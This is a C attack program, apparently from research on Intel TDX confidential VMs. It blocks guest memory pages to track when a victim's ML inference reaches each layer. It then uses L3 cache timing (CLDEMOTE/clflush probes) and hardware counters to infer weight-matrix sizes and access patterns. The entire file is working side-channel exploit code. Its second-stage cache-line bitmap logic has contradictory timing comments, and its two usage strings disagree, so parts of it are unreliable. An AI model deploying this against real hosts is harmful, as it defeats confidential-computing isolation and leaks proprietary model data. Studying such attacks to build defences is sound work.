// 2-cldemote-attack.c  (Gen 1 — validated)
//
// Extends the page-fault attack with a CLDEMOTE-based L3 contention
// timing channel. At each START marker the attacker seats a 4 MB probe
// buffer in L3 using CLDEMOTE and records a baseline read latency.
// After the victim's layer runs, the probe buffer is re-read and the
// latency delta reveals how much L3 pressure the layer generated,
// which is proportional to its weight matrix size.
//
// LLC hardware counters are also read between each START/END pair as
// a secondary signal.
//
// Build:
//   With cldemote (Sapphire/Emerald Rapids):
//     gcc -O2 -DHAVE_CLDEMOTE=1 -o attack 2-cldemote-attack.c -I../tdxutils/
//   Without cldemote (fallback to clflush):
//     gcc -O2 -DHAVE_CLDEMOTE=0 -o attack 2-cldemote-attack.c -I../tdxutils/
//
// Usage:
//   sudo ./attack <model> <GPA1> <GPA2> ...
//   Models: mlp, cnn, resnet, transformer

#ifndef HAVE_CLDEMOTE
#define HAVE_CLDEMOTE 0
#endif

#include <linux/perf_event.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <poll.h>
#include "../tdxutils/tdxutils.h"
#include <time.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>

#define CRESET "\033[39m"
#define CGRN   "\033[92m"
#define CCYN   "\033[96m"
#define CYEL   "\033[93m"

// ---------------------------------------------------------------------------
// Probe buffer parameters
//
// 4 MB at cache-line stride. Large enough to occupy ~18% of the 22.5 MB L3
// so victim-induced evictions are detectable, small enough that one full
// pass takes well under 1 ms.
// ---------------------------------------------------------------------------
#define PROBE_SIZE    (4 * 1024 * 1024)
#define CACHE_LINE    64
#define PROBE_STRIDE  CACHE_LINE
#define PROBE_REPEATS 3

static unsigned char *probe_buf;

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
static int      expected_end_idx      = -1;
static int      counter_active        = 0;
static int      llc_refs_fd           = -1;
static int      llc_misses_fd         = -1;
static uint64_t baseline_probe_cycles = 0;

// ---------------------------------------------------------------------------
// Gen 2: per-cache-line spatial bitmap state
// ---------------------------------------------------------------------------
#define PAGE_SIZE_4K     4096
#define LINES_PER_PAGE   (PAGE_SIZE_4K / CACHE_LINE)   // 64
#define L3_SETS          32768   // 22.5MB L3 / 64B line / 11 ways (approx)

static int     current_offset  = 0;              // 0..63, which 64B line we probe
static uint8_t bitmap[16][LINES_PER_PAGE];       // [layer][offset] -> 0/1/0xff
static unsigned long last_weight_hpa = 0;        // HPA of victim weight page

static unsigned long weight_page_gpa = 0;  // GPA of victim weight page passed via argv

// ---------------------------------------------------------------------------
// Low-level helpers
// ---------------------------------------------------------------------------

static inline uint64_t rdtsc(void) {
    unsigned int lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

static inline void mfence_all(void) {
    asm volatile("mfence" ::: "memory");
}

static inline void lfence(void) {
    asm volatile("lfence" ::: "memory");
}

static inline void clflush_line(void *p) {
    asm volatile("clflush (%0)" :: "r"(p) : "memory");
}

#if HAVE_CLDEMOTE
// CLDEMOTE: move a cache line from L1/L2 down to L3 without full eviction.
// Opcode 0F 1C /0 — not yet in GCC built-ins, emit via .byte.
static inline void cldemote_line(void *p) {
    asm volatile(".byte 0x0f, 0x1c, 0x07" :: "D"(p) : "memory");
}
#else
// Fallback: full eviction via clflush gives a coarser Flush+Reload signal.
static inline void cldemote_line(void *p) {
    clflush_line(p);
}
#endif


/*
 * get_hpa_from_gpa - read the SEPT entry for a GPA and extract the HPA.
 *
 * Uses the existing seamcall_tdh_mem_sept_rd call. Returns 0 on failure.
 * No kernel modification needed — this SEAMCALL is already available.
 */
static unsigned long get_hpa_from_gpa(int util_fd, unsigned long gpa,
                                      unsigned long tdr_pa) {
    union tdx_sept_entry entry;
    unsigned long rc;

    /* Try 2MB level first */
    rc = seamcall_tdh_mem_sept_rd(util_fd, 1,
                                  gpa & ~((1ul << 21) - 1),
                                  tdr_pa, (void *)&entry, NULL);
    if (rc == TDX_SUCCESS && entry.pfn)
        return (unsigned long)entry.pfn << 12;

    /* Fall back to 4KB level */
    rc = seamcall_tdh_mem_sept_rd(util_fd, 0,
                                  gpa & ~0xffful,
                                  tdr_pa, (void *)&entry, NULL);
    if (rc == TDX_SUCCESS && entry.pfn)
        return (unsigned long)entry.pfn << 12;

    return 0;
}

/*
 * probe_line_for_set - find a line in our probe buffer that maps to the
 * same L3 cache set as the given HPA.
 *
 * L3 set index = (PA >> 6) & (L3_SETS - 1)  [bits 6..20 for 32K sets]
 * We scan our probe buffer for a line whose PA matches that set index.
 * Since probe_buf is contiguous, we can compute the PA of each line as
 * probe_buf_pa + i*CACHE_LINE where probe_buf_pa is the physical address
 * of the start of the probe buffer (obtained once via /proc/self/pagemap).
 */
static unsigned long probe_buf_pa = 0;   /* physical address of probe_buf[0] */

static void init_probe_buf_pa(void) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) { perror("open pagemap"); return; }

    unsigned long vaddr  = (unsigned long)probe_buf;
    unsigned long pfn_idx = vaddr / 4096;
    uint64_t entry = 0;

    if (lseek(fd, (off_t)(pfn_idx * 8), SEEK_SET) < 0 ||
        read(fd, &entry, 8) != 8) {
        perror("pagemap read");
        close(fd);
        return;
    }
    close(fd);

    if (!(entry & (1ULL << 63))) {
        fprintf(stderr, "probe_buf page not present in pagemap\n");
        return;
    }

    probe_buf_pa = (unsigned long)((entry & ((1ULL << 55) - 1)) << 12)
                   | (vaddr & 0xfff);
    printf(CYEL "[gen2] probe_buf VA=0x%lx PA=0x%lx\n" CRESET,
           vaddr, probe_buf_pa);
}

static void *get_probe_line_for_hpa(unsigned long hpa) {
    if (!probe_buf_pa || !hpa) return NULL;

    unsigned long target_set = (hpa >> 6) & (L3_SETS - 1);

    for (size_t i = 0; i < PROBE_SIZE; i += CACHE_LINE) {
        unsigned long line_pa  = probe_buf_pa + i;
        unsigned long line_set = (line_pa >> 6) & (L3_SETS - 1);
        if (line_set == target_set)
            return &probe_buf[i];
    }
    return NULL;
}

static void print_bitmap(void) {
    int layer, off;
    printf(CYEL "\n=== Gen 2 Spatial Access Bitmap ===\n" CRESET);
    printf("        ");
    for (off = 0; off < LINES_PER_PAGE; off++) printf("%d", off % 10);
    printf("\n");
    for (layer = 0; layer < 16; layer++) {
        int has = 0;
        for (off = 0; off < LINES_PER_PAGE; off++)
            if (bitmap[layer][off] != 0xff) { has = 1; break; }
        if (!has) continue;
        printf("layer%2d ", layer);
        for (off = 0; off < LINES_PER_PAGE; off++) {
            if      (bitmap[layer][off] == 0xff) printf(".");
            else if (bitmap[layer][off] == 1)    printf("1");
            else                                  printf("0");
        }
        printf("\n");
    }
    printf(CYEL "====================================\n" CRESET);
}

// ---------------------------------------------------------------------------
// Probe buffer lifecycle
// ---------------------------------------------------------------------------

static void init_probe_buffer(void) {
    probe_buf = aligned_alloc(CACHE_LINE, PROBE_SIZE);
    if (!probe_buf) {
        perror("aligned_alloc");
        exit(EXIT_FAILURE);
    }
    memset(probe_buf, 0xAB, PROBE_SIZE);

    // Warm up: bring everything into cache.
    volatile unsigned long sum = 0;
    for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
        sum += probe_buf[i];
    mfence_all();
    (void)sum;
}

/*
 * prepare_probe_buffer - called at each START marker before the TD resumes.
 *
 * Flushes every probe line from all cache levels, then (in CLDEMOTE mode)
 * reads each line back and immediately demotes it to L3. After this call
 * the entire probe buffer sits in L3 and nowhere else, giving a clean
 * baseline for the contention measurement.
 */
static void prepare_probe_buffer(void) {
    for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
        clflush_line(&probe_buf[i]);
    mfence_all();

#if HAVE_CLDEMOTE
    volatile unsigned long sum = 0;
    for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE) {
        sum += probe_buf[i];          // pull line into L1
        cldemote_line(&probe_buf[i]); // push back to L3
    }
    mfence_all();
    (void)sum;
#endif
}

/*
 * measure_probe_cycles - time a full sequential read of the probe buffer.
 *
 * Lines still in L3 will be fast. Lines evicted by the victim to DRAM will
 * be slow. The difference (post − baseline) is the contention signal.
 */
static uint64_t measure_probe_cycles(void) {
    volatile unsigned long sum = 0;
    uint64_t start, end;

    lfence();
    mfence_all();
    start = rdtsc();

    for (int r = 0; r < PROBE_REPEATS; r++)
        for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
            sum += probe_buf[i];

    mfence_all();
    end = rdtsc();
    (void)sum;

    return end - start;
}

// ---------------------------------------------------------------------------
// perf_event LLC counters
// ---------------------------------------------------------------------------

static long perf_event_open_counter(struct perf_event_attr *hw_event,
                                    pid_t pid, int cpu, int group_fd,
                                    unsigned long flags) {
    return syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

static int open_llc_counter(uint64_t op, uint64_t result) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(struct perf_event_attr));
    pe.type           = PERF_TYPE_HW_CACHE;
    pe.size           = sizeof(struct perf_event_attr);
    pe.config         = PERF_COUNT_HW_CACHE_LL | (op << 8) | (result << 16);
    pe.disabled       = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv     = 0;

    int fd = perf_event_open_counter(&pe, -1, 2, -1, 0);
    if (fd == -1) {
        perror("perf_event_open");
        return -1;
    }
    return fd;
}

static void init_perf_counters(void) {
    llc_refs_fd = open_llc_counter(PERF_COUNT_HW_CACHE_OP_READ,
                                   PERF_COUNT_HW_CACHE_RESULT_ACCESS);
    llc_misses_fd = open_llc_counter(PERF_COUNT_HW_CACHE_OP_READ,
                                     PERF_COUNT_HW_CACHE_RESULT_MISS);
    if (llc_refs_fd == -1 || llc_misses_fd == -1) {
        fprintf(stderr, "Could not open LLC hardware counters\n");
        exit(EXIT_FAILURE);
    }
}

static void reset_start_counters(void) {
    ioctl(llc_refs_fd,   PERF_EVENT_IOC_DISABLE, 0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_DISABLE, 0);
    ioctl(llc_refs_fd,   PERF_EVENT_IOC_RESET,   0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_RESET,   0);
    ioctl(llc_refs_fd,   PERF_EVENT_IOC_ENABLE,  0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_ENABLE,  0);
    counter_active = 1;
}

static void stop_read_counters(uint64_t *llc_refs, uint64_t *llc_misses) {
    ioctl(llc_refs_fd,   PERF_EVENT_IOC_DISABLE, 0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_DISABLE, 0);
    ssize_t ret;
    ret = read(llc_refs_fd,   llc_refs,   sizeof(uint64_t));
    if (ret != sizeof(uint64_t)) perror("read llc_refs");
    ret = read(llc_misses_fd, llc_misses, sizeof(uint64_t));
    if (ret != sizeof(uint64_t)) perror("read llc_misses");
}

// ---------------------------------------------------------------------------
// Timing helper
// ---------------------------------------------------------------------------

static unsigned long long now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
    return ((unsigned long long)ts.tv_sec * 1000000000ULL) + ts.tv_nsec;
}

// ---------------------------------------------------------------------------
// TDX / GPA helpers
// ---------------------------------------------------------------------------

static unsigned char get_gpa_level(int util_fd, unsigned long gpa,
                                   unsigned long tdr_pa) {
    union tdx_sept_entry entry;
    unsigned long rc;
    rc = seamcall_tdh_mem_sept_rd(util_fd, 1,
                                  gpa & ~((1ul << 21) - 1),
                                  tdr_pa, (void *)&entry, NULL);
    if (rc != TDX_SUCCESS) {
        fprintf(stderr, "Error: could not resolve GPA 0x%lx\n", gpa);
        exit(EXIT_FAILURE);
    }
    return entry.leaf ? 1 : 0;
}

static int block_single_gpa(int util_fd, unsigned long gpa,
                             unsigned long tdr_pa) {
    unsigned char level = get_gpa_level(util_fd, gpa, tdr_pa);
    struct tdx_gpa_range range = {
        .start  = level_align(gpa, level),
        .end    = level_align(gpa, level) + level_pg_size(level),
        .tdr_pa = tdr_pa,
        .level  = level,
    };
    return ioctl(util_fd, IOCTL_TDX_BLOCK_GPA_RANGE, &range);
}

static int same_2mb_page(unsigned long a, unsigned long b) {
    return (a & ~((1ul << 21) - 1)) == (b & ~((1ul << 21) - 1));
}

// ---------------------------------------------------------------------------
// Marker name tables
// ---------------------------------------------------------------------------

static const char *marker_name(const char *model, int idx) {
    if (strcmp(model, "mlp") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "L1_START";
            case 2: return "L1_END";
            case 3: return "L2_START";
            case 4: return "L2_END";
            case 5: return "L3_START";
            case 6: return "L3_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }
    if (strcmp(model, "cnn") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "CONV_START";
            case 2: return "CONV_END";
            case 3: return "POOL_START";
            case 4: return "POOL_END";
            case 5: return "FC1_START";
            case 6: return "FC1_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }
    if (strcmp(model, "resnet") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "BLOCK1_START";
            case 2: return "BLOCK1_END";
            case 3: return "BLOCK2_START";
            case 4: return "BLOCK2_END";
            case 5: return "CLASSIFIER_START";
            case 6: return "CLASSIFIER_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }
    if (strcmp(model, "transformer") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "QKV_START";
            case 2: return "QKV_END";
            case 3: return "ATTENTION_START";
            case 4: return "ATTENTION_END";
            case 5: return "FFN_START";
            case 6: return "FFN_END";
            case 7: return "CLASSIFIER_START";
            case 8: return "CLASSIFIER_END";
            case 9: return "TERM";
            default: return "UNKNOWN";
        }
    }
    return "UNKNOWN";
}

static int find_marker(unsigned long accessed, unsigned long *gpa,
                       int num_gpas) {
    for (int i = 0; i < num_gpas; i++)
        if (same_2mb_page(accessed, gpa[i]))
            return i;
    return -1;
}

static int is_start_marker(int idx, const char *model) {
    if (strcmp(model, "transformer") == 0)
        return idx == 1 || idx == 3 || idx == 5 || idx == 7;
    return idx == 1 || idx == 3 || idx == 5;
}

static int is_end_marker(int idx, const char *model) {
    if (strcmp(model, "transformer") == 0)
        return idx == 2 || idx == 4 || idx == 6 || idx == 8;
    return idx == 2 || idx == 4 || idx == 6;
}

static int matching_end_marker(int start_idx) {
    if (start_idx == 1) return 2;
    if (start_idx == 3) return 4;
    if (start_idx == 5) return 6;
    if (start_idx == 7) return 8;
    return -1;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

int main(int argc, char *argv[]) {
    struct pollfd pfd;
    unsigned long access_counter = 0, address_accessed = 0;
    unsigned long long start_ns = 0, last_ns = 0, current_ns = 0;
    unsigned long tdr_pa;
    int util_fd, status;

    if (argc < 4) {
        fprintf(stderr,
            "Usage: %s <model> <weight_GPA> <marker_GPA1> <marker_GPA2> ...\n"
            "Models: mlp, cnn, resnet, transformer\n"
            "weight_GPA: GPA of the victim weight matrix page to probe\n",
            argv[0]);
        exit(EXIT_SUCCESS);
    }

    const char *model    = argv[1];

    // argv[2] = weight page GPA to probe for Gen 2
    // argv[3..] = marker GPAs for page fault synchronization
    char *endptr = NULL;
    weight_page_gpa = strtoul(argv[2], &endptr, 0);
    if (*endptr != '\0') {
        fprintf(stderr, "Could not parse weight GPA '%s'\n", argv[2]);
        exit(EXIT_FAILURE);
    }
    printf(CYEL "[gen2] probing weight page GPA 0x%lx\n" CRESET,
           weight_page_gpa);

    int num_gpas = argc - 3;
    unsigned long *gpa = malloc(num_gpas * sizeof(unsigned long));
    if (!gpa) { perror("malloc"); exit(EXIT_FAILURE); }

    for (int i = 0; i < num_gpas; i++) {
        endptr = NULL;
        gpa[i] = strtoul(argv[i + 3], &endptr, 0);
        if (*endptr != '\0') {
            fprintf(stderr, "Could not parse GPA '%s'\n", argv[i + 3]);
            free(gpa);
            exit(EXIT_FAILURE);
        }
    }

    init_probe_buffer();
    memset(bitmap, 0xff, sizeof(bitmap));
    init_probe_buf_pa();
    init_perf_counters();

    util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
    if (util_fd < 0) { perror("open"); exit(EXIT_FAILURE); }

    tdr_pa = get_tdr_pa(util_fd);

    // Drain any stale events from a previous run.
    while (read(util_fd, &address_accessed, sizeof(address_accessed)) > 0) {}

    for (int i = 0; i < num_gpas; i++) {
        if (block_single_gpa(util_fd, gpa[i], tdr_pa) < 0) {
            perror("ioctl");
            fprintf(stderr, "Could not block GPA 0x%lx\n", gpa[i]);
            free(gpa);
            exit(EXIT_FAILURE);
        }
        printf("Blocked %s page GPA 0x%lx\n",
               get_gpa_level(util_fd, gpa[i], tdr_pa) ? "2MB" : "4kB",
               gpa[i]);
    }

    start_ns = now_ns();
    last_ns  = start_ns;

    printf("\n" CGRN
           "%-8s %-16s %-16s %-14s %-20s "
           "%-14s %-14s %-14s %-14s"
           CRESET "\n",
           "count", "time_ns", "delta_ns", "gpa", "marker",
           "llc_refs", "llc_misses", "baseline_cyc", "post_cyc");

    pfd = (struct pollfd){ .fd = util_fd, .events = POLLIN };

    do {
        status = poll(&pfd, 1, 250);
        if (status <= 0)
            continue;

        status = read(util_fd, &address_accessed, sizeof(address_accessed));
        if (status <= 0)
            continue;

        current_ns = now_ns();

        int idx          = find_marker(address_accessed, gpa, num_gpas);
        const char *name = marker_name(model, idx);

        uint64_t llc_refs    = 0;
        uint64_t llc_misses  = 0;
        uint64_t post_cycles = 0;

        if (is_start_marker(idx, model)) {
            // Gen 1: seat probe buffer in L3, record baseline.
            prepare_probe_buffer();
            baseline_probe_cycles = measure_probe_cycles();
            reset_start_counters();
            expected_end_idx = matching_end_marker(idx);

            // Gen 2: get HPA of the faulting weight page and flush the
            // probe buffer line that maps to the same L3 cache set.
            // All done in userspace — no kernel changes needed.
            last_weight_hpa = get_hpa_from_gpa(util_fd,
                                               weight_page_gpa, tdr_pa);
            if (last_weight_hpa) {
                unsigned long target_hpa = last_weight_hpa
                                         + (current_offset * CACHE_LINE);
                void *probe_line = get_probe_line_for_hpa(target_hpa);
                if (probe_line) {
                    clflush_line(probe_line);
                    mfence_all();
                }
            }
        }

        if (is_end_marker(idx, model) && counter_active) {
            // Gen 1: stop counters and re-measure probe buffer.
            stop_read_counters(&llc_refs, &llc_misses);
            counter_active   = 0;
            expected_end_idx = -1;
            post_cycles = measure_probe_cycles();
        }

        if (is_end_marker(idx, model) && last_weight_hpa) {
            // Gen 2: reload the same probe line we flushed at START.
            // Time how long it takes — slow = victim warmed that cache
            // set (HIT, bit=1), fast = victim never touched it (MISS, bit=0).
            if (last_weight_hpa) {
                unsigned long target_hpa = last_weight_hpa
                                         + (current_offset * CACHE_LINE);
                void *probe_line = get_probe_line_for_hpa(target_hpa);
                if (probe_line) {
                    int layer_idx = (idx / 2) - 1;
                    uint64_t t1, t2, reload_delta;
                    volatile unsigned char dummy;

                    mfence_all();
                    t1 = rdtsc();
                    dummy = *(volatile unsigned char *)probe_line;
                    mfence_all();
                    t2 = rdtsc();
                    reload_delta = t2 - t1;
                    (void)dummy;

                    // L3 hit ~150-300 cycles, L1/L2 hit ~10-50 cycles,
                    // DRAM miss ~800+ cycles. Threshold at 400:
                    // fast (<400) = line still cold = victim did NOT touch
                    // this cache set = MISS = bit 0.
                    // slow (>=400) = line was warmed by victim = HIT = bit 1.
                    uint8_t bit = (reload_delta >= 400) ? 1 : 0;

                    if (layer_idx >= 0 && layer_idx < 16)
                        bitmap[layer_idx][current_offset] = bit;

                    printf(CYEL
                           "  [gen2] layer=%d offset=%d reload=%lu -> bit=%d\n"
                           CRESET,
                           layer_idx, current_offset,
                           (unsigned long)reload_delta, bit);

                    // Only advance offset on the LAST layer's END marker
                    // so we probe one offset per complete inference run.
                    // For MLP: L3_END is idx=6. For CNN: FC1_END is idx=6.
                    // For ResNet/Transformer: CLASSIFIER_END is idx=6 or 8.
                    // We advance when we see the last END before TERM.
                    int last_end = (strcmp(model, "transformer") == 0) ? 8 : 6;
                    if (idx == last_end) {
                        current_offset = (current_offset + 1) % LINES_PER_PAGE;
                        if (current_offset == 0) {
                            print_bitmap();
                            printf(CYEL
                                   "[gen2] Full page scanned (%d inferences)."
                                   " Restarting.\n" CRESET, LINES_PER_PAGE);
                        }
                    }
                }
            }
        }

        printf(CGRN
               "%-8lu %-16llu %-16llu 0x%012lx %-20s "
               "%-14lu %-14lu %-14lu %-14lu"
               CRESET "\n",
               access_counter,
               current_ns - start_ns,
               current_ns - last_ns,
               address_accessed,
               name,
               llc_refs,
               llc_misses,
               (unsigned long)baseline_probe_cycles,
               (unsigned long)post_cycles);

        last_ns = current_ns;

        if (block_single_gpa(util_fd, address_accessed, tdr_pa) < 0)
            break;

        access_counter++;

    } while (status >= 0);

    printf("\nStopping.\n");

    if (status < 0) {
        perror("poll/ioctl");
        exit(EXIT_FAILURE);
    }

    print_bitmap();
    free(gpa);
    return 0;
}
